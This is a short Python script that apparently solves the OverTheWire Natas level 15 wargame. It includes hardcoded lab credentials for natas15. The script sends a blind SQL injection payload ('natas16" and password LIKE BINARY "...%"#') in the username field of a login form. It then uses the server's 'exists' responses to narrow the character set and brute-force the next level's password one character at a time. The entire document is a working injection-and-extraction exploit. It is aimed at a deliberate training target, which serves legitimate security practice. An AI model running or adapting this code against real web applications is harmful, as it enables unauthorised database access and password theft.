import requests
from requests.auth import HTTPBasicAuth
import string

#variables
dicts = ''.join(string.ascii_letters+string.digits) #create a-zA-Z0-10 strings of characters
dicts_filtered = ''
password = '' #buffer to store each gen password
loginCreds = {'username' : 'natas15','password':'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'}
sqlURI = 'http://natas15.natas.labs.overthewire.org/index.php?debug'
SQLQuery = '" and password LIKE BINARY "{}{}%"#'

#filter the character in dictionary get only the exist characters
for char in dicts:
    reqData = {'username':'natas16" and password LIKE BINARY "%{}%"#'.format(char)}
    res = requests.post(sqlURI,auth=HTTPBasicAuth(loginCreds['username'],loginCreds['password']), data=reqData)
    if 'exists' in res.text:
        dicts_filtered +=char

print('filtered:{}'.format(dicts_filtered))

#start bruteforcing using filtered 
print('Bruteforcing.....')
for i in range(0,32):
    for char in dicts_filtered:
        reqData = {'username':'natas16'+SQLQuery.format(password,char)}
        res = requests.post(sqlURI,auth=HTTPBasicAuth(loginCreds['username'],loginCreds['password']), data=reqData)
        #print(char)
        if 'exists' in res.text :
            print(password)
            password +=char
            break

print('password: {}'.format(password))